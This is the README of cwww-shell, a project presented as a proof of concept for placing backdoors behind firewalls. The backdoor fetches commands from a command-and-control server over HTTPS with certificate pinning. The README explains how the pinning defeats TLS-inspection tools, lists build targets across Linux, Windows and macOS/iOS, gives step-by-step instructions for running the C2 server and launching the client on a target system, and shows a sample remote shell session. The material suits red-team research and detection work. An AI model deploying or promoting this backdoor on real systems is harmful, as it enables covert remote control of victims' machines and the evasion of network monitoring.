<h3 align="left">
    <img width="70%" src="data/logo.png">
</h3>

*There is no way to win without losing first (yes, I tried in assembly and failed severely)*

[![Developer](https://img.shields.io/badge/developer-enty8080-blue.svg)](https://founder.entysec.com)
[![Language](https://img.shields.io/badge/language-C-grey.svg)](https://github.com/enty8080/cwww-shell)
[![Language](https://img.shields.io/badge/language-Python-blue.svg)](https://github.com/enty8080/cwww-shell)
[![Forks](https://img.shields.io/github/forks/enty8080/cwww-shell?style=flat&color=green)](https://github.com/enty8080/cwww-shell/forks)
[![Stars](https://img.shields.io/github/stars/enty8080/cwww-shell?style=flat&color=yellow)](https://github.com/enty8080/cwww-shell/stargazers)

A proof-of-concept of placing backdoors behind firewalls using HTTPS communication with command & control server. This tool uses HTTPS requests with TLS pinning to fetch commands and return output to a control server.

Assembly code might be coming soon. Yes, I hate myself that much :P

## How this works

This project secures command execution using HTTPS (TLS) combined with public-key pinning.
Instead of relying on the operating system's Certificate Authority (CA) store, the client explicitly trusts only one server key.

This provides strong protection against man-in-the-middle (MITM) attacks while avoiding any dependency on external certificate files.

The security model is based on three principles:

* **TLS encryption** ensures confidentiality and integrity of data in transit.
* **Self-signed certificates** are allowed on the server.
* **Public-key pinning** makes the server’s public key the sole root of trust.

The client will refuse to communicate with any server that does not present the exact pinned public key, even if the certificate would otherwise be valid.

## Importance of this PoC

TLS public-key pinning gives the client **exclusive trust** in a single server key.
While designed for security, this property can also benefit attackers.

Because traffic is:

* **Strongly encrypted**
* **Immune to TLS interception proxies**
* **Independent of system CA trust**

network security tools **cannot decrypt or modify payloads**, even in environments where HTTPS interception is normally enforced.

This means inspection systems may be limited to:

* traffic metadata (IP, port, timing, volume)
* behavioral analysis
* endpoint detection

rather than content analysis.

### Context note

These same properties are why TLS pinning is widely used by:

* browsers
* mobile apps
* operating systems
* security-sensitive software

## Building

```
make TARGET=<target>
```

**NOTE:** For *macOS / iOS* targets you are required to set `SDK` to the desired SDK path before running `make`. For example:

```
make TARGET=<target> SDK=<path>
```

You can find list of supported `TARGET` values for different platforms.

<details>
    <summary>Linux</summary><br>
    <code>aarch64-linux-musl</code><br>
    <code>armv5l-linux-musleabi</code><br>
    <code>i486-linux-musl</code><br>
    <code>x86_64-linux-musl</code><br>
    <code>powerpc-linux-muslsf</code><br>
    <code>powerpc64le-linux-musl</code><br>
    <code>mips-linux-muslsf</code><br>
    <code>mipsel-linux-muslsf</code><br>
    <code>mips64-linux-musl</code><br>
    <code>s390x-linux-musl</code><br>
    <br>
</details>

<details>
    <summary>Windows</summary><br>
    <code>x86_64-w64-mingw32</code><br>
    <code>x86_64-w64-mingw32</code><br>
    <br>
</details>

<details>
    <summary>macOS / iOS</summary><br>
    <code>arm-iphone-darwin</code><br>
    <code>aarch64-iphone-darwin</code><br>
    <code>i386-apple-darwin</code><br>
    <code>x86_64-apple-darwin</code><br>
    <code>aarch64-apple-darwin</code><br>
    <br>
</details>

## Usage

1. Generate certificate and public key hash using `make cert`.
2. Insert public key hash into `PINNED_PUBKEY` macro inside `main.c`.
3. Build `main.c` using `make`.
4. Execute `main.py <host> <port> server.crt server.key` on command & control server
5. Execute `cwww https://<host>:<port>/` on target system

**NOTE:** Sample server certificate available, so you can omit steps 1 and 2.

**Example:**

```
Welcome to the cwww-shell v2.0 by Ivan Nikolskiy / enty8080

Introduction: Wait for your client to connect, examine it's output and then
              type in your commands to execute on client. You'll have to
              wait some time between commands. Use ";" for multiple commands.
              Trying to execute interactive commands may give you headache
              so beware. You also shouldn't try to view binary data too.
              "echo bla >> file", "cat >> file <<- EOF", sed etc. are your
              friends if you don't like using vi in a delayed line mode.
              To exit this program on any time without doing harm to either
              server or client just type "quit".


Waiting for connect ... connect from 127.0.0.1:50194

$ whoami
sent.

Waiting for connect ... connect from 127.0.0.1:50195

felix

Waiting for connect ... connect from 127.0.0.1:50197

$
```
